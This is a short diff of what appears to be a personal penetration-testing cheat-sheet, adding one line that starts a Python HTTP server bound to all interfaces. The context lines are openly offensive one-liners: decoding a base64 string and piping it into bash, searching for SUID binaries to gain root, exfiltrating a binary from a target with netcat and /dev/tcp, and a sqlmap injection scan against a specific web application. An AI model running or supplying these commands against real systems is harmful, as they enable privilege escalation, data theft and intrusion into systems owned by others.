@@ -8,3 +8,4 @@ echo 'put_your_encoded_string_here' | base64 -d | bash
 find / -perm -u=s -type f 2>/dev/null ( Getting root account )
 nc -lvnp 3333 > reset_root (our terminal) | cat /usr/bin/reset_root > /dev/tcp/192.168.10.10 3333 ( target terminal) : get the file
 sqlmap -u "http://192.168.0.107/jabcd0cs/ajax_udf.php?q=1&add_value=odm_user" --dbms=mysql --batch --level=5 --tables
+python3 -m http.server 8000 --bind 0.0.0.0
